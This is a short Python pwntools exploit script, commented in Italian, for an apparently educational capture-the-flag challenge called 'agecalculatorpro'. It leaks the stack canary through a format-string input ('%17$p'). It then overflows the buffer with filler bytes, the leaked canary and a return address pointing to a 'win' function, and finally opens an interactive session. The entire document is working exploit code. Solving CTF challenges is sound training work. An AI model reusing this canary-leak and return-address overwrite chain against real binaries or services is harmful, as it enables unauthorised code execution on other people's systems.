#p32 per gli interi
from pwn import *
from Crypto.Util.number import bytes_to_long
context.terminal = ('kgx', '-e')
def main():

    conn = remote('agecalculatorpro.challs.olicyber.it', 38103)
    
    conn.recvuntil(b"?\n") #What's your name?
    
    conn.sendline(b'%17$p') #17 salti

        
    canary = conn.recvuntil(b",")[2:-1]  #what's your birth year?
    print(f'canary2: {canary}')
    
    payload = b'A' * 72           # Riempie il buffer (72 byte)
    payload += p64(int(canary,16))      # Passa il canary
    payload +=  b'B' * 8          # Riempie RBP
    payload +=  p64(0x4011f6)       # indirizzo della win
    
    conn.sendline(payload)
    print(payload.hex())
    
    conn.interactive()
    response = conn.recvline()
    print(response.decode())

if __name__ == "__main__":
    main()